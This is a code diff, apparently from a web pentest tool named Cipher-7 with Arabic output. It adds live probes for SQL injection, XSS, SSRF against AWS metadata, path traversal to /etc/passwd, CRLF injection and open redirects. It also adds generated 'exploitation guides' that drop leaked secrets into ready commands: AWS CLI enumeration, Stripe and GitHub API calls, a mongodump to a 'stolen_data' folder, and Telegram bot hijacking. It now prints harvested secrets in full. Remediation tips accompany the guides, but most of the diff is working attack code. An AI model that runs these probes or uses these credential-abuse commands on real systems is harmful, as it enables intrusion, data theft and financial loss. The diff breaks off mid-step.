@@ -7491,7 +7491,420 @@ if __name__ == "__main__":
     if (acao === "*" || acao === "https://evil-attacker.com") corsVulnerable = true;
   } catch {}
 
-  // ═══ BUILD 14 STEPS ═══
+  // ═══ DEEP VULNERABILITY SCANNING (Phase 8-10) ═══
+  interface VulnProbeResult { type: string; severity: "critical"|"high"|"medium"|"low"; url: string; payload: string; evidence: string; exploitable: boolean; }
+  const vulnResults: VulnProbeResult[] = [];
+
+  // --- SQL Injection Probes ---
+  const sqliPayloads = [
+    { payload: "' OR '1'='1", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated|query/i },
+    { payload: "1' AND '1'='1' --", indicator: /sql|syntax|mysql|postgresql|sqlite|oracle|ORA-|unterminated/i },
+    { payload: "1 UNION SELECT NULL--", indicator: /sql|syntax|UNION|column|mysql|postgresql/i },
+    { payload: "'; WAITFOR DELAY '0:0:5'--", indicator: /sql|syntax|WAITFOR/i },
+    { payload: "1' OR SLEEP(3)--", indicator: /sql|syntax|SLEEP/i },
+  ];
+  const sqliTargets = apiEndpoints.filter(u => /\?/.test(u) || /\/search|\/query|\/find|\/get|\/list|\/user|\/login|\/auth/i.test(u)).slice(0, 5);
+  const formActions = [...new Set((webData.html.match(/action=["']([^"']+)["']/gi) || []).map(a => a.replace(/action=["']/i, "").replace(/["']$/, "")))].slice(0, 3);
+  const sqliTestUrls = [...sqliTargets, ...formActions.map(f => f.startsWith("http") ? f : baseUrl + f)];
+
+  const sqliProbes = sqliTestUrls.slice(0, 5).flatMap(url => sqliPayloads.slice(0, 2).map(async ({ payload, indicator }) => {
+    try {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      clearTimeout(t);
+      const body = await r.text();
+      if (indicator.test(body)) {
+        vulnResults.push({ type: "SQL Injection", severity: "critical", url: testUrl, payload, evidence: body.match(indicator)?.[0] || "SQL error detected", exploitable: true });
+      }
+    } catch {}
+  }));
+
+  // --- XSS (Reflected) Probes ---
+  const xssPayloads = [
+    { payload: '<script>alert(1)</script>', indicator: /<script>alert\(1\)<\/script>/i },
+    { payload: '"><img src=x onerror=alert(1)>', indicator: /onerror=alert/i },
+    { payload: "'-alert(1)-'", indicator: /'-alert\(1\)-'/i },
+    { payload: "{{7*7}}", indicator: /49/ },
+  ];
+  const xssTestUrls = [...sqliTestUrls.slice(0, 3), ...allEndpoints.filter(u => u.includes(domain) && /\?/.test(u)).slice(0, 2)];
+
+  const xssProbes = xssTestUrls.slice(0, 4).flatMap(url => xssPayloads.slice(0, 2).map(async ({ payload, indicator }) => {
+    try {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?q=${encodeURIComponent(payload)}`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      clearTimeout(t);
+      const body = await r.text();
+      if (indicator.test(body) && body.includes(payload)) {
+        vulnResults.push({ type: "Reflected XSS", severity: "high", url: testUrl, payload, evidence: "Payload reflected in response without sanitization", exploitable: true });
+      }
+    } catch {}
+  }));
+
+  // --- Open Redirect Probes ---
+  const redirectParams = ["url", "redirect", "next", "return", "returnTo", "goto", "continue", "dest", "destination", "redir", "redirect_uri", "return_url"];
+  const redirectProbes = redirectParams.slice(0, 5).map(async (param) => {
+    try {
+      const testUrl = `${baseUrl}/login?${param}=https://evil-attacker.com`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "manual" });
+      clearTimeout(t);
+      const location = r.headers.get("location") || "";
+      if (location.includes("evil-attacker.com")) {
+        vulnResults.push({ type: "Open Redirect", severity: "medium", url: testUrl, payload: `${param}=https://evil-attacker.com`, evidence: `Redirects to: ${location}`, exploitable: true });
+      }
+    } catch {}
+  });
+
+  // --- Directory Traversal Probes ---
+  const traversalPayloads = ["../../../etc/passwd", "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"];
+  const traversalTargets = apiEndpoints.filter(u => /\/file|\/download|\/read|\/load|\/include|\/template|\/path|\/img|\/image/i.test(u)).slice(0, 3);
+  const traversalProbes = traversalTargets.flatMap(url => traversalPayloads.slice(0, 2).map(async (payload) => {
+    try {
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?file=${encodeURIComponent(payload)}`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      clearTimeout(t);
+      const body = await r.text();
+      if (/root:x:|root:.*:0:0|localhost|127\.0\.0\.1|\[boot loader\]/i.test(body)) {
+        vulnResults.push({ type: "Directory Traversal / LFI", severity: "critical", url: testUrl, payload, evidence: body.slice(0, 200), exploitable: true });
+      }
+    } catch {}
+  }));
+
+  // --- SSRF Probes ---
+  const ssrfTargets = apiEndpoints.filter(u => /\/fetch|\/proxy|\/url|\/link|\/callback|\/webhook|\/preview|\/render/i.test(u)).slice(0, 3);
+  const ssrfProbes = ssrfTargets.map(async (url) => {
+    try {
+      const payload = "http://169.254.169.254/latest/meta-data/";
+      const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : `${url}?url=${encodeURIComponent(payload)}`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      clearTimeout(t);
+      const body = await r.text();
+      if (/ami-id|instance-id|iam|security-credentials/i.test(body)) {
+        vulnResults.push({ type: "SSRF", severity: "critical", url: testUrl, payload, evidence: "AWS metadata endpoint accessible", exploitable: true });
+      }
+    } catch {}
+  });
+
+  // --- Subdomain Enumeration ---
+  const commonSubdomains = ["www", "api", "admin", "dev", "staging", "test", "mail", "ftp", "cpanel", "dashboard", "app", "portal", "cdn", "assets", "static", "db", "backend", "internal", "vpn", "git", "jenkins", "ci", "monitor", "grafana", "kibana"];
+  const baseDomain = domain.replace(/^www\./, "");
+  const discoveredSubdomains: { subdomain: string; status: number; server: string }[] = [];
+  const subdomainProbes = commonSubdomains.map(async (sub) => {
+    try {
+      const subUrl = `https://${sub}.${baseDomain}`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 5_000);
+      const r = await fetch(subUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "follow" });
+      clearTimeout(t);
+      discoveredSubdomains.push({ subdomain: `${sub}.${baseDomain}`, status: r.status, server: r.headers.get("server") || "unknown" });
+    } catch {}
+  });
+
+  // --- Header Injection / CRLF ---
+  const crlfProbes = [async () => {
+    try {
+      const testUrl = `${baseUrl}/%0d%0aSet-Cookie:%20hacked=true`;
+      const ctrl = new AbortController();
+      const t = setTimeout(() => ctrl.abort(), 8_000);
+      const r = await fetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0" }, signal: ctrl.signal, redirect: "manual" });
+      clearTimeout(t);
+      const setCookie = r.headers.get("set-cookie") || "";
+      if (setCookie.includes("hacked")) {
+        vulnResults.push({ type: "CRLF Injection", severity: "high", url: testUrl, payload: "%0d%0aSet-Cookie: hacked=true", evidence: "Injected header reflected in response", exploitable: true });
+      }
+    } catch {}
+  }()];
+
+  // --- Run all probes in parallel ---
+  await Promise.allSettled([...sqliProbes, ...xssProbes, ...redirectProbes, ...traversalProbes, ...ssrfProbes, ...subdomainProbes, ...crlfProbes]);
+
+  // Update risk score with deep scan findings
+  riskScore += vulnResults.filter(v => v.severity === "critical").length * 20;
+  riskScore += vulnResults.filter(v => v.severity === "high").length * 10;
+  riskScore += vulnResults.filter(v => v.severity === "medium").length * 5;
+  riskScore += discoveredSubdomains.length * 1;
+  riskScore = Math.min(100, riskScore);
+
+  // ═══ BUILD EXPLOITATION GUIDE PER SECRET TYPE ═══
+  interface ExploitGuide { secretType: string; secretValue: string; description: string; steps: string[]; commands: string[]; impact: string; remediation: string[]; }
+  const exploitGuides: ExploitGuide[] = [];
+
+  for (const s of allSecrets) {
+    if (s.type.includes("Firebase API Key")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "مفتاح Firebase API يسمح بالوصول إلى خدمات Firebase (المصادقة، قاعدة البيانات، التخزين)",
+        steps: [
+          "1. يقوم المخترق بنسخ مفتاح API من كود الموقع",
+          "2. يستخدم المفتاح لإنشاء حساب مجهول (Anonymous Auth) عبر Firebase Authentication",
+          "3. بعد الحصول على توكن المصادقة، يحاول قراءة قاعدة بيانات Realtime Database",
+          "4. يحاول تعداد المجموعات في Firestore",
+          "5. يحاول رفع ملفات خبيثة إلى Firebase Storage",
+          "6. يمكنه إنشاء حسابات وهمية بأعداد كبيرة لاستنزاف الحصة المجانية",
+        ],
+        commands: [
+          `curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${s.value}" -H "Content-Type: application/json" -d '{}'`,
+          firebaseDbUrl ? `curl -s "${firebaseDbUrl}/.json?shallow=true"` : `# لا يوجد RTDB URL`,
+          `curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${s.value}" -H "Content-Type: application/json" -d '{"returnSecureToken":true}' | python3 -m json.tool`,
+        ],
+        impact: "الوصول الكامل إلى بيانات المستخدمين، إنشاء حسابات وهمية، سرقة أو حذف البيانات",
+        remediation: [
+          "أضف Firebase Security Rules لتقييد الوصول",
+          "فعّل App Check لمنع الاستخدام غير المصرّح",
+          "قيّد مفتاح API في Google Cloud Console على domains محددة",
+          "راقب الاستخدام غير الطبيعي في Firebase Console",
+        ],
+      });
+    }
+    if (s.type.includes("AWS Access Key")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "مفتاح AWS IAM يسمح بالوصول إلى البنية التحتية السحابية بالكامل",
+        steps: [
+          "1. يقوم المخترق بنسخ Access Key و Secret Key من كود الموقع",
+          "2. يثبّت AWS CLI ويضبط المفاتيح: aws configure",
+          "3. يتحقق من الهوية: aws sts get-caller-identity",
+          "4. يحاول عرض جميع S3 buckets: aws s3 ls",
+          "5. يحاول قراءة الملفات: aws s3 cp s3://bucket-name/ ./local/ --recursive",
+          "6. يحاول إنشاء مستخدم IAM جديد بصلاحيات كاملة",
+          "7. يحاول الوصول إلى EC2, RDS, Lambda, DynamoDB",
+          "8. يمكنه تعدين العملات الرقمية على حساب الضحية",
+        ],
+        commands: [
+          `aws configure set aws_access_key_id ${s.value}`,
+          `aws sts get-caller-identity`,
+          `aws s3 ls`,
+          `aws iam list-users`,
+          `aws ec2 describe-instances --region us-east-1`,
+          `aws lambda list-functions --region us-east-1`,
+        ],
+        impact: "السيطرة الكاملة على البنية التحتية السحابية — سرقة بيانات، تعدين عملات، حذف موارد، فاتورة مالية ضخمة",
+        remediation: [
+          "قم بتدوير (rotate) المفاتيح فوراً من AWS Console",
+          "احذف المفاتيح من كود المصدر واستخدم IAM Roles",
+          "فعّل MFA على حساب AWS root",
+          "استخدم AWS Secrets Manager لإدارة الأسرار",
+          "فعّل CloudTrail لمراقبة النشاط المشبوه",
+          "طبّق مبدأ الحد الأدنى من الصلاحيات (Least Privilege)",
+        ],
+      });
+    }
+    if (s.type.includes("JWT Token") || s.type.includes("Bearer Token")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "توكن مصادقة يسمح بانتحال هوية المستخدم",
+        steps: [
+          "1. يقوم المخترق بنسخ التوكن من كود الموقع",
+          "2. يفك تشفير JWT ويقرأ المحتوى (Header + Payload)",
+          "3. يستخدم التوكن في Authorization header للوصول إلى API",
+          "4. يمكنه تنفيذ أي عملية بصلاحيات صاحب التوكن",
+          "5. إذا كان التوكن لمستخدم admin، يحصل على صلاحيات كاملة",
+          "6. يمكنه تعديل بيانات المستخدمين وحذفها",
+        ],
+        commands: [
+          `echo "${s.value.split('.')[1]}" | base64 -d 2>/dev/null | python3 -m json.tool`,
+          `curl -s "${baseUrl}/api/user" -H "Authorization: Bearer ${s.value}"`,
+          `curl -s "${baseUrl}/api/admin" -H "Authorization: Bearer ${s.value}"`,
+        ],
+        impact: "انتحال هوية المستخدم، الوصول إلى بيانات حساسة، تعديل أو حذف البيانات",
+        remediation: [
+          "لا تضع التوكنات في كود JavaScript — استخدم HttpOnly Cookies",
+          "أضف انتهاء صلاحية قصير للتوكنات",
+          "استخدم Refresh Token pattern",
+          "أبطل جميع التوكنات المكشوفة فوراً",
+          "أضف IP binding أو device fingerprinting للتوكنات",
+        ],
+      });
+    }
+    if (s.type.includes("Stripe")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "مفتاح Stripe يسمح بالوصول إلى بيانات الدفع والعمليات المالية",
+        steps: [
+          "1. يقوم المخترق بنسخ مفتاح Stripe من كود الموقع",
+          "2. إذا كان Secret Key (sk_): يمكنه قراءة جميع المعاملات المالية",
+          "3. يمكنه إنشاء عمليات استرداد (refunds) وهمية",
+          "4. يمكنه قراءة بيانات بطاقات الائتمان المخزنة (جزئياً)",
+          "5. يمكنه إنشاء روابط دفع وهمية لسرقة أموال العملاء",
+        ],
+        commands: [
+          `curl https://api.stripe.com/v1/charges -u "${s.value}:"`,
+          `curl https://api.stripe.com/v1/customers -u "${s.value}:"`,
+          `curl https://api.stripe.com/v1/balance -u "${s.value}:"`,
+        ],
+        impact: "سرقة بيانات مالية، إنشاء عمليات استرداد وهمية، خسائر مالية مباشرة",
+        remediation: [
+          "استخدم فقط Publishable Key (pk_) في الواجهة الأمامية",
+          "احتفظ بـ Secret Key (sk_) في الخادم فقط",
+          "قم بتدوير المفاتيح فوراً من Stripe Dashboard",
+          "فعّل Webhook signing لمنع التلاعب",
+        ],
+      });
+    }
+    if (s.type.includes("MongoDB")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "رابط اتصال MongoDB يسمح بالوصول المباشر إلى قاعدة البيانات",
+        steps: [
+          "1. يقوم المخترق بنسخ connection string من كود الموقع",
+          "2. يستخدم mongosh أو Compass للاتصال مباشرة بقاعدة البيانات",
+          "3. يعرض جميع قواعد البيانات: show dbs",
+          "4. يعرض جميع المجموعات: show collections",
+          "5. يقرأ بيانات المستخدمين: db.users.find()",
+          "6. يمكنه تعديل أو حذف جميع البيانات",
+          "7. يمكنه إنشاء مستخدم admin جديد",
+        ],
+        commands: [
+          `mongosh "${s.value}"`,
+          `mongosh "${s.value}" --eval "db.adminCommand({listDatabases:1})"`,
+          `mongosh "${s.value}" --eval "db.getCollectionNames()"`,
+          `mongodump --uri="${s.value}" --out=./stolen_data/`,
+        ],
+        impact: "سرقة قاعدة البيانات بالكامل، تعديل أو حذف البيانات، إنشاء حسابات admin",
+        remediation: [
+          "لا تضع connection string في كود الواجهة الأمامية",
+          "استخدم متغيرات البيئة على الخادم فقط",
+          "قيّد الوصول بـ IP Whitelist",
+          "غيّر كلمة مرور قاعدة البيانات فوراً",
+          "فعّل MongoDB Atlas audit logging",
+        ],
+      });
+    }
+    if (s.type.includes("GitHub Token")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "توكن GitHub يسمح بالوصول إلى المستودعات الخاصة وتعديل الكود",
+        steps: [
+          "1. يقوم المخترق بنسخ التوكن من كود الموقع",
+          "2. يتحقق من صلاحيات التوكن",
+          "3. يعرض جميع المستودعات الخاصة",
+          "4. يقرأ الكود المصدري الكامل",
+          "5. يمكنه زرع backdoor في الكود",
+          "6. يمكنه حذف المستودعات",
+        ],
+        commands: [
+          `curl -H "Authorization: token ${s.value}" https://api.github.com/user`,
+          `curl -H "Authorization: token ${s.value}" https://api.github.com/user/repos?type=private`,
+          `curl -H "Authorization: token ${s.value}" https://api.github.com/user/orgs`,
+        ],
+        impact: "الوصول إلى الكود المصدري الخاص، زرع أكواد خبيثة، حذف المستودعات",
+        remediation: [
+          "أبطل التوكن فوراً من GitHub Settings > Developer Settings",
+          "أنشئ توكن جديد بأقل صلاحيات ممكنة",
+          "استخدم GitHub Secrets للـ CI/CD بدلاً من التوكنات المباشرة",
+          "فعّل Secret Scanning في المستودع",
+        ],
+      });
+    }
+    if (s.type.includes("SendGrid")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "مفتاح SendGrid يسمح بإرسال رسائل بريد إلكتروني من حسابك",
+        steps: [
+          "1. يقوم المخترق بنسخ مفتاح API من كود الموقع",
+          "2. يرسل رسائل تصيّد (phishing) بإسم شركتك",
+          "3. يمكنه قراءة جميع الرسائل المرسلة سابقاً",
+          "4. يمكنه تعديل إعدادات الحساب",
+          "5. يستخدم حسابك لإرسال spam بكميات كبيرة",
+        ],
+        commands: [
+          `curl -X POST "https://api.sendgrid.com/v3/mail/send" -H "Authorization: Bearer ${s.value}" -H "Content-Type: application/json" -d '{"personalizations":[{"to":[{"email":"test@test.com"}]}],"from":{"email":"you@domain.com"},"subject":"Test","content":[{"type":"text/plain","value":"Hacked"}]}'`,
+        ],
+        impact: "إرسال رسائل تصيّد بإسم شركتك، تدمير سمعة البريد الإلكتروني، حظر النطاق",
+        remediation: [
+          "أبطل المفتاح فوراً من SendGrid Dashboard",
+          "أنشئ مفتاح جديد واحفظه في متغيرات البيئة",
+          "قيّد صلاحيات المفتاح (API Key Permissions)",
+          "فعّل IP Access Management",
+        ],
+      });
+    }
+    if (s.type.includes("Hardcoded Password")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "كلمة مرور مكشوفة في كود الموقع",
+        steps: [
+          "1. يقوم المخترق بنسخ كلمة المرور من كود الموقع",
+          "2. يحاول تسجيل الدخول إلى لوحة التحكم/الإدارة",
+          "3. يجرب كلمة المرور على خدمات أخرى (credential stuffing)",
+          "4. يحاول الوصول إلى قاعدة البيانات أو SSH أو FTP",
+        ],
+        commands: [
+          `curl -X POST "${baseUrl}/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"${s.value}"}'`,
+          `curl -X POST "${baseUrl}/admin/login" -d "username=admin&password=${s.value}"`,
+        ],
+        impact: "الوصول إلى لوحة التحكم، سرقة البيانات، تعديل المحتوى",
+        remediation: [
+          "احذف كلمة المرور من الكود فوراً",
+          "غيّر كلمة المرور في جميع الخدمات",
+          "استخدم متغيرات البيئة لتخزين كلمات المرور",
+          "فعّل المصادقة الثنائية (2FA)",
+        ],
+      });
+    }
+    if (s.type.includes("Google Maps API Key") || s.type.includes("Google OAuth")) {
+      exploitGuides.push({
+        secretType: s.type, secretValue: s.value,
+        description: "مفتاح Google API يمكن استغلاله لاستنزاف الحصة أو الوصول إلى خدمات Google",
+        steps: [
+          "1. يقوم المخترق بنسخ المفتاح من كود الموقع",
+          "2. يستخدم المفتاح لإجراء آلاف الطلبات على Google APIs",
+          "3. يستنزف الحصة المجانية ويسبب فاتورة مالية كبيرة",
+          "4. يمكنه استخدام المفتاح في تطبيقات أخرى على حسابك",
+        ],
+        commands: [
+          `curl "https://maps.googleapis.com/maps/api/geocode/json?address=test&key=${s.value}"`,
+          `curl "https://maps.googleapis.com/maps/api/directions/json?origin=NYC&destination=LA&key=${s.value}"`,
+        ],
+        impact: "فاتورة مالية كبيرة من Google Cloud، استنزاف الحصة، تعطيل الخدمات",
+        remediation: [
+          "قيّد المفتاح على domains محددة في Google Cloud Console",
+          "قيّد المفتاح على APIs محددة فقط",
+          "أضف حدود استخدام (Quotas) يومية",
+          "راقب الاستخدام في Google Cloud Console",
+        ],
+      });
+    }
+  }
+
+  // Telegram bot exploitation guides
+  for (const t of telegramBots) {
+    exploitGuides.push({
+      secretType: "Telegram Bot Token", secretValue: t,
+      description: "توكن بوت Telegram يسمح بالتحكم الكامل في البوت",
+      steps: [
+        "1. يقوم المخترق بنسخ التوكن من كود الموقع",
+        "2. يتحقق من معلومات البوت: getMe",
+        "3. يقرأ جميع الرسائل الواردة: getUpdates",
+        "4. يرسل رسائل لجميع المستخدمين بإسم البوت",
+        "5. يمكنه تعديل إعدادات البوت وتغيير الأوامر",
+        "6. يمكنه سرقة بيانات المحادثات والمستخدمين",
+      ],
+      commands: [
+        `curl "https://api.telegram.org/bot${t}/getMe"`,
+        `curl "https://api.telegram.org/bot${t}/getUpdates"`,
+        `curl -X POST "https://api.telegram.org/bot${t}/sendMessage" -d "chat_id=CHAT_ID&text=Hacked"`,
+      ],
+      impact: "التحكم الكامل في البوت، قراءة المحادثات، إرسال رسائل خبيثة",
+      remediation: [
+        "أعد توليد التوكن عبر @BotFather (/revoke)",
+        "لا تضع التوكن في كود الواجهة الأمامية",
+        "استخدم متغيرات البيئة على الخادم",
+        "أضف Webhook secret للتحقق من مصدر الطلبات",
+      ],
+    });
+  }
+
+  // ═══ BUILD STEPS ═══
   const webSteps: any[] = [
     {
       id: 1, title: "استطلاع الموقع (Reconnaissance)",
@@ -7520,9 +7933,8 @@ if __name__ == "__main__":
       status: criticalCount > 0 ? "danger" : allSecrets.length > 0 ? "warning" : "success",
       findings: [
         `═══ الأسرار المستخرجة (${allSecrets.length}) ═══`,
-        ...allSecrets.slice(0, 30).map(s => `   🔑 [${s.type}] ${s.value.slice(0, 60)}${s.value.length > 60 ? "..." : ""} — ${s.source}`),
-        allSecrets.length === 0 ? `   ✅ لم يتم العثور على أسرار مكشوفة` : "",
-        allSecrets.length > 30 ? `   ... +${allSecrets.length - 30} سر إضافي` : "",
+        ...allSecrets.map(s => `   🔑 [${s.type}] ${s.value} — المصدر: ${s.source}`),
+        allSecrets.length === 0 ? `   ✅ لم يتم العثور على أسرار مكشوفة` : ``,
       ].filter(Boolean),
       commands: [`curl -s "${webData.url}" | grep -oE "AIza[0-9A-Za-z_-]{35}"`, `curl -s "${webData.url}" | grep -oE "sk_(live|test)_[0-9a-zA-Z]{24,}"`],
     },
@@ -7593,7 +8005,7 @@ if __name__ == "__main__":
       details: `${telegramBots.length} Telegram — ${slackWebhooks.length} Slack — ${discordWebhooks.length} Discord`,
       status: (telegramBots.length + slackWebhooks.length + discordWebhooks.length) > 0 ? "warning" : "info",
       findings: [
-        `═══ Telegram Bots ═══`, ...telegramBots.map(t => `   🤖 ${t.slice(0, 20)}...`), telegramBots.length === 0 ? `   ✅ لا يوجد` : "",
+        `═══ Telegram Bots ═══`, ...telegramBots.map(t => `   🤖 ${t}`), telegramBots.length === 0 ? `   ✅ لا يوجد` : ``,
         ``, `═══ Slack Webhooks ═══`, ...slackWebhooks.map(w => `   💬 ${w}`), slackWebhooks.length === 0 ? `   ✅ لا يوجد` : "",
         ``, `═══ Discord Webhooks ═══`, ...discordWebhooks.map(w => `   🎮 ${w}`), discordWebhooks.length === 0 ? `   ✅ لا يوجد` : "",
       ].filter(Boolean),
@@ -7763,10 +8175,13 @@ if __name__ == "__main__":
         `   {{7*7}} (SSTI test)`,
         `   ' OR '1'='1' -- (SQLi test)`,
         ``, `═══ الأدوات المستخدمة ═══`,
-        `   ✅ Cipher-7 Web Engine v7.0 — 14 مرحلة`,
+        `   ✅ Cipher-7 Web Engine v10.0 — ${17 + exploitGuides.length} مرحلة`,
         `   ✅ HTTP Header Analyzer`, `   ✅ JavaScript Source Scanner`,
         `   ✅ Firebase Live Prober`, `   ✅ AWS Resource Detector`,
         `   ✅ CORS Vulnerability Tester`, `   ✅ Sensitive Path Scanner`,
+        `   ✅ Deep Vulnerability Scanner (SQLi, XSS, SSRF, LFI)`,
+        `   ✅ Subdomain Enumerator`,
+        `   ✅ Exploitation Guide Generator`,
       ].filter(Boolean),
       commands: [
         `python3 cipher7_web_pentest_${domain.replace(/\./g, "_")}.py`,
@@ -7776,7 +8191,161 @@ if __name__ == "__main__":
       ].filter(Boolean),
       pythonScript,
     },
+    {
+      id: 15, title: "Cipher-7: الفحص العميق — SQL Injection & XSS (Phase 8)",
+      details: `${vulnResults.filter(v => v.type === "SQL Injection").length} SQLi + ${vulnResults.filter(v => v.type === "Reflected XSS").length} XSS — فحص ${sqliTestUrls.length + xssTestUrls.length} نقطة`,
+      status: vulnResults.filter(v => v.type === "SQL Injection" || v.type === "Reflected XSS").length > 0 ? "danger" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 DEEP SCAN — SQL INJECTION & XSS TESTING          ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ فحص SQL Injection ═══`,
+        `🎯 النقاط المفحوصة: ${sqliTestUrls.length}`,
+        `💉 الحمولات المختبرة: ${sqliPayloads.length}`,
+        `🔴 الثغرات المكتشفة: ${vulnResults.filter(v => v.type === "SQL Injection").length}`,
+        ``,
+        ...vulnResults.filter(v => v.type === "SQL Injection").map(v =>
+          `   🔴 [CRITICAL] SQLi في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type === "SQL Injection").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات SQL Injection` : "",
+        ``,
+        `═══ فحص XSS (Cross-Site Scripting) ═══`,
+        `🎯 النقاط المفحوصة: ${xssTestUrls.length}`,
+        `💉 الحمولات المختبرة: ${xssPayloads.length}`,
+        `🟡 الثغرات المكتشفة: ${vulnResults.filter(v => v.type === "Reflected XSS").length}`,
+        ``,
+        ...vulnResults.filter(v => v.type === "Reflected XSS").map(v =>
+          `   🟡 [HIGH] XSS في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type === "Reflected XSS").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات XSS` : "",
+      ].filter(Boolean),
+      commands: [
+        `sqlmap -u "${sqliTestUrls[0] || baseUrl + "/api/search?q=test"}" --batch --level=3 --risk=2`,
+        `python3 -c "import requests; r=requests.get('${baseUrl}/?q=<script>alert(1)</script>'); print('XSS!' if '<script>' in r.text else 'Safe')"`,
+      ],
+    },
+    {
+      id: 16, title: "Cipher-7: الفحص العميق — SSRF & LFI & Open Redirect (Phase 9)",
+      details: `${vulnResults.filter(v => ["SSRF", "Directory Traversal / LFI", "Open Redirect", "CRLF Injection"].includes(v.type)).length} ثغرات مكتشفة`,
+      status: vulnResults.filter(v => v.type === "SSRF" || v.type === "Directory Traversal / LFI").length > 0 ? "danger" : vulnResults.filter(v => v.type === "Open Redirect" || v.type === "CRLF Injection").length > 0 ? "warning" : "success",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 DEEP SCAN — SSRF, LFI, REDIRECT, CRLF            ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ فحص SSRF (Server-Side Request Forgery) ═══`,
+        `🎯 النقاط المفحوصة: ${ssrfTargets.length}`,
+        ...vulnResults.filter(v => v.type === "SSRF").map(v =>
+          `   🔴 [CRITICAL] SSRF في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type === "SSRF").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات SSRF` : "",
+        ``,
+        `═══ فحص Directory Traversal / LFI ═══`,
+        `🎯 النقاط المفحوصة: ${traversalTargets.length}`,
+        ...vulnResults.filter(v => v.type === "Directory Traversal / LFI").map(v =>
+          `   🔴 [CRITICAL] LFI في: ${v.url}\n      الحمولة: ${v.payload}\n      الدليل: ${v.evidence.slice(0, 100)}`
+        ),
+        vulnResults.filter(v => v.type === "Directory Traversal / LFI").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات LFI` : "",
+        ``,
+        `═══ فحص Open Redirect ═══`,
+        `🎯 البارامترات المفحوصة: ${redirectParams.length}`,
+        ...vulnResults.filter(v => v.type === "Open Redirect").map(v =>
+          `   🟠 [MEDIUM] Open Redirect: ${v.url}\n      ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type === "Open Redirect").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات Open Redirect` : "",
+        ``,
+        `═══ فحص CRLF Injection ═══`,
+        ...vulnResults.filter(v => v.type === "CRLF Injection").map(v =>
+          `   🟡 [HIGH] CRLF Injection: ${v.url}\n      ${v.evidence}`
+        ),
+        vulnResults.filter(v => v.type === "CRLF Injection").length === 0 ? `   ✅ لم يتم اكتشاف ثغرات CRLF` : "",
+      ].filter(Boolean),
+      commands: [
+        `curl -s "${baseUrl}/?url=http://169.254.169.254/latest/meta-data/"`,
+        `curl -s "${baseUrl}/?file=../../../etc/passwd"`,
+        `curl -I "${baseUrl}/login?redirect=https://evil.com"`,
+        `curl -I "${baseUrl}/%0d%0aSet-Cookie:%20hacked=true"`,
+      ],
+    },
+    {
+      id: 17, title: "Cipher-7: تعداد النطاقات الفرعية (Phase 10)",
+      details: `${discoveredSubdomains.length} نطاق فرعي نشط من ${commonSubdomains.length} محاولة`,
+      status: discoveredSubdomains.length > 5 ? "success" : discoveredSubdomains.length > 0 ? "info" : "info",
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   CIPHER-7 — SUBDOMAIN ENUMERATION                           ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `🌐 النطاق الأساسي: ${baseDomain}`,
